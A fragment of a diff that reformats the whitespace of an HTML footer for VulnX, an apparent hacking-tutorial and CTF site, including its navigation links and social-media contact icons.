-    	<h1 id="footerHeading" style="cursor: pointer; background-color: transparent; font-family: 'Saira Stencil One'; font-size: 50px;" onclick="location.href='https://vulnx.in/'">VulnX</h1>
-    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/'">Home</p>
-    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/resources.html'">Resources</p>
-    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/tutorials.html'">Tutorials</p>
-    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/ctfs.html'">CTFs</p>
-  
-    	<h1 id="footerHeading" style="background-color: transparent; font-family: 'Ubuntu';">Contact</h1>
-          
-    	<i class="fab fa-facebook-f" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='#'"></i>
-    	<i class="fab fa-google" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'"></i>
-      <i class="fab fa-instagram" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='https://www.instagram.com/vulnx_hacking'">	</i>
-    	<i class="fab fa-youtube" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='https://bit.ly/VulnX_YT'"></i>
+        <h1 id="footerHeading" style="cursor: pointer; background-color: transparent; font-family: 'Saira Stencil One'; font-size: 50px;" onclick="location.href='https://vulnx.in/'">VulnX</h1>
+        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/'">Home</p>
+        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/resources.html'">Resources</p>
+        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/tutorials.html'">Tutorials</p>
+        <p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/ctfs.html'">CTFs</p>
+        <h1 id="footerHeading" style="background-color: transparent; font-family: 'Ubuntu';">Contact</h1>
+        <i class="fab fa-facebook-f" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='#'"></i>
+        <i class="fab fa-google" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'"></i>
+        <i class="fab fa-instagram" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='https://www.instagram.com/vulnx_hacking'"> </i>
+        <i class="fab fa-youtube" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='https://bit.ly/VulnX_YT'"></i>
     </div>
 </body>
+
 </html>
